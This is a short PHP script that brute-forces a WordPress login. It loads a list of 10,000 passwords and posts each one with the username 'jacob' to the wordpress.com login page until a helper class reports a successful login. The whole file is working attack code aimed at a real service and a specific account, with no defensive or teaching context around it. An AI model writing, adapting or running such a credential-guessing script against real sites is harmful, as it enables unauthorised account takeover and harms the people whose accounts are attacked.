<?php

class BruteForce{
	protected $Login;
	function __construct(){
		include('login/login-oop.php');
		$this->Login = new Login;
	}

	function Test($url,$log,$pwd_list,$error){
		$pwd_list = explode("\n",$pwd_list);
		foreach ($pwd_list as $key => $pwd) {
			//echo "$pwd \n";
			$post = 'log=' . $log . '&pwd=' . $pwd . '&wp-submit=Log+In';
			if($this->Login->TestCreds($url,$post,$log,$pwd,$error)==true){
				return;
			}
		}
	}
}
$pwd_list = file_get_contents("lists/10000pwd.txt");

$url = 'https://wordpress.com/wp-login.php';
$log = "jacob";
$error = "ERROR";


$bf = new BruteForce;
$bf->Test($url,$log,$pwd_list,$error);